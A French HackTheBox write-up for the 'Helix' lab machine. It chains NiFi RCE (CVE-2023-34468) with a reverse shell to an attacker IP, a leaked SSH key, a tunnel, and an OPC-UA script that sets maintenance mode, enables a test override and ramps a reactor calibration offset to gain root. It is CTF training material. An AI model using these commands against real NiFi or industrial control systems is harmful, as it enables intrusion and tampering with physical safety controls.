🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Helix : HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9ef7dfc0282a2ed0dfd37bc16fd15bb5.png" width="120"/>
<div>

**Difficulté**: Medium
**OS**: Linux
**Type**: ICS / Middleware / OPC-UA

</div>
</div>

---

## Résumé de la chaîne d'exploitation

```
RCE via CVE-2023-34468 (Apache NiFi 1.21.0, ExecuteSQL + H2 JDBC)
→ Shell nifi
→ Clé SSH operator dans support-bundles NiFi
→ User flag
→ Manipulation OPC-UA (Mode MAINTENANCE + TestOverride + CalibrationOffset ramp)
→ Maintenance window ouverte → sudo helix-maint-console
→ ROOT
```

---

## Énumération

### Scan Nmap

```bash
nmap -sV -sC helix.htb -oN scan.txt
```

Ports ouverts :
- **80** : nginx (reverse proxy vers NiFi)

### Découverte des services

Le vhost `flow.helix.htb` expose une instance **Apache NiFi 1.21.0** accessible sans authentification.
La version est visible via le menu *About Apache NiFi* dans l'interface.

---

## Foothold : RCE via CVE-2023-34468

### Vulnérabilité

Apache NiFi ≤ 1.22.0 est vulnérable à une **exécution de code à distance non authentifiée** via le processeur `ExecuteSQL`. En configurant une JDBC URL H2 malveillante avec `INIT=RUNSCRIPT`, il est possible de faire exécuter du SQL arbitraire au serveur, y compris des appels système via `EXEC`.

### Exploitation avec koi

On lance d'abord un listener avec koi, puis on utilise le PoC public [Al3xx-sec/CVE-2023-34468-POC](https://github.com/Al3xx-sec/CVE-2023-34468-POC) :

```bash
# koi génère automatiquement les payloads pour l'interface tun0
b3rt1ng@koi❯ payload tun0
# → bash: bash -c "bash -i >& /dev/tcp/10.10.16.6/4010 0>&1"

# Exploitation
python3 exploit.py -u http://flow.helix.htb/nifi -l 10.10.16.6 -p 4010
```

koi reçoit le shell et propose l'upgrade automatique :

```
▶  New session #1  10.129.223.240:54146 [ linux ]
b3rt1ng@koi(1 session) ❯ upgrade 1
  ✔  Shell #1 upgraded successfully.
b3rt1ng@koi(1 session) ❯ go 1
nifi@helix:/opt/nifi-1.21.0$
```

---

## Énumération post-exploitation (nifi)

### Informations système via koi

```
b3rt1ng@koi(1 session) ❯ run sysinfo 1
╭──────────────────────── System Info : #1 ────────────────────────╮
│  hostname  : helix                                               │
│  OS        : Ubuntu 22.04.5 LTS                                  │
│  arch      : x86_64                                              │
│  user      : uid=998(nifi) gid=998(nifi)                         │
│  IP        : 10.129.223.240                                      │
╰──────────────────────────────────────────────────────────────────╯

b3rt1ng@koi(1 session) ❯ run env_dump 1
# Rien de sensible dans les variables d'environnement.

b3rt1ng@koi(1 session) ❯ run memorybleed 1
# Pas de credentials en mémoire.
```

### Ports internes

```bash
# Dans le shell nifi
ss -tlnp
```

Ports internes découverts :
- **4840** : OPC-UA (`opc.tcp://127.0.0.1:4840/helix/`)
- **8081** : HMI Helix (Werkzeug/Python)

Le HMI sur le port 8081 révèle un panneau de contrôle de réacteur industriel :

```bash
curl -s http://127.0.0.1:8081/
# → Helix Industries : Reactor HMI
# → Temperature: 284.0°C | Pressure: 69.00 bar
# → Maintenance Window: CLOSED
# → OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/
```

### Clé SSH operator

```bash
find /opt/nifi-1.21.0 -name "*.bak" 2>/dev/null
# → /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak

cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
# → -----BEGIN OPENSSH PRIVATE KEY-----
```

Une clé SSH privée ed25519 est stockée en clair dans les support-bundles NiFi.

---

## User Flag

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb
cat ~/user.txt
```


## Élévation de privilèges

### Énumération

```bash
sudo -l
```

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

`helix-maint-console` nécessite que la **Maintenance Window** soit ouverte. Elle est contrôlée par le PLC via OPC-UA.

### Récupération des documents opérateur

On utilise le module `download` de koi pour récupérer les fichiers du home operator. Les espaces dans les noms de fichiers nécessitent un renommage préalable sur la cible :

```bash
# Sur la cible
cp ~/control\ systems\ diagram.png /tmp/diagram.png
cp ~/Operator\ Control\ \&\ Safety\ Guide.pdf /tmp/guide.pdf
```

```
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/diagram.png
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/guide.pdf
```

Le PDF est protégé par le mot de passe `operator 1` (cracké avec john + rockyou). On le déchiffre :

```bash
python3 -c "
import pikepdf
pdf = pikepdf.open('guide.pdf', password='operator 1')
pdf.save('guide_unlocked.pdf')
"
```

Le diagramme et le PDF documentent la logique du système :

> La Maintenance Window s'ouvre quand **Temp ≥ 295°C OU Pression ≥ 73 bar**, sans déclencher de safety trip (305°C / 75 bar), et uniquement en **mode MAINTENANCE** avec **TestOverride activé**.

### Tunnel vers OPC-UA avec koi + ligolo

Le port 4840 est uniquement accessible en loopback sur la cible. On utilise le module ligolo de koi pour uploader l'agent automatiquement :

```
b3rt1ng@koi(1 session) ❯ run ligolo 1
  ✔  Agent uploaded to /tmp/agent
```

```bash
# Sur Kali, lancer le proxy ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Sur la cible
/tmp/agent -connect 10.10.16.6:11601 -ignore-cert
```

```
# Dans la console ligolo
ligolo-ng » session
[Agent : nifi@helix] » start

# 240.0.0.1 est l'alias ligolo pour le 127.0.0.1 de l'agent distant
sudo ip route add 240.0.0.1/32 dev ligolo
```

### Découverte des nodes OPC-UA

```bash
pip3 install asyncua --break-system-packages

python3 << 'EOF'
from asyncua.sync import Client
from asyncua import ua

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

for i in range(1, 100):
    try:
        node = c.get_node(ua.NodeId(i, 2))
        name = node.read_browse_name()
        val  = node.read_value()
        print(f"ns=2;i={i} | {name.Name} = {val}")
    except:
        pass

c.disconnect()
EOF
```

```
ns=2;i=3  | TemperatureRaw     = 283.97
ns=2;i=4  | Temperature        = 283.97
ns=2;i=5  | Pressure           = 68.99
ns=2;i=6  | CalibrationOffset  = 0.0
ns=2;i=8  | RodsInserted       = False
ns=2;i=9  | EmergencyCooling   = False
ns=2;i=10 | TripActive         = False
ns=2;i=12 | Mode               = NORMAL
ns=2;i=13 | TestOverride       = False
ns=2;i=14 | ResetTrip          = False
```

Nodes writables identifiés :

| NodeId    | Nom               | Accès     |
|-----------|-------------------|-----------|
| ns=2;i=6  | CalibrationOffset | Writable  |
| ns=2;i=12 | Mode              | Writable  |
| ns=2;i=13 | TestOverride      | Writable  |
| ns=2;i=14 | ResetTrip         | Writable  |

### Manipulation OPC-UA : ouverture de la Maintenance Window

Selon le PDF, l'ordre des opérations est critique :
1. Passer en mode `MAINTENANCE`
2. Activer `TestOverride`
3. Monter `CalibrationOffset` progressivement, car une ramp trop agressive déclenche un safety trip (≥ 305°C)

```python
from asyncua.sync import Client
from asyncua import ua
import time

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

# Step 1 : Mode MAINTENANCE
mode = c.get_node(ua.NodeId(12, 2))
mode.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
print(f"[+] Mode: {mode.read_value()}")

# Step 2 : TestOverride = True
override = c.get_node(ua.NodeId(13, 2))
override.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
print(f"[+] TestOverride: {override.read_value()}")

# Step 3 : Ramp CalibrationOffset jusqu'à 12.0 (Temp ~ 296°C)
offset = c.get_node(ua.NodeId(6, 2))
for val in [3.0, 6.0, 9.0, 12.0]:
    offset.write_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
    temp = c.get_node(ua.NodeId(4, 2)).read_value()
    print(f"[+] Offset={val} -> Temp={temp:.2f}°C")
    time.sleep(1)

c.disconnect()
```

```
[+] Mode: MAINTENANCE
[+] TestOverride: True
[+] Offset=3.0  -> Temp=287.06°C
[+] Offset=6.0  -> Temp=290.13°C
[+] Offset=9.0  -> Temp=293.18°C
[+] Offset=12.0 -> Temp=296.22°C
```

### Shell Root

Une fois la Maintenance Window ouverte, on lance immédiatement `helix-maint-console` (fenêtre limitée dans le temps) :

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 113 seconds
root@helix:~#
```

---

## Root Flag

```bash
cat /root/root.txt
```
